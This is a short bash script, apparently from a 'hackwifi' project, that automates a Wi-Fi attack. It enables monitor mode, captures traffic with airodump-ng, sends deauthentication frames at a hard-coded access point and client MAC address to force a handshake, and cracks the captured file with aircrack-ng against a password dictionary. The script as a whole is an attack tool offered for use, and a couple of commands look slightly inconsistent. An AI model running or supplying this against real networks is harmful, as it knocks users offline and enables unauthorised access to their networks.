#!/bin/bash

#Récupère le dernier fichier .cap créé
fichier=$(ls -got | grep \.cap$ | head -1 | awk '{print $7}')
echo "$fichier"

airmon-ng start wlan0
airodump-ng -w /var/www/html/project/hackwifi/actif -c 1 wlan0mon
airmon-ng start wlan1mon
aireplay-ng --deauth 25 -a 6E:8D:C1:49:88:14 -c AC:BC:32:7D:3F:9B wlan0mon
sleep 10
airmon-ng stop wlan0mon
pkill airodump-ng
aircrack-ng /var/www/html/project/hackwifi/$fichier -w /var/www/html/project/hackwifi/dictionnaire_projet.txt
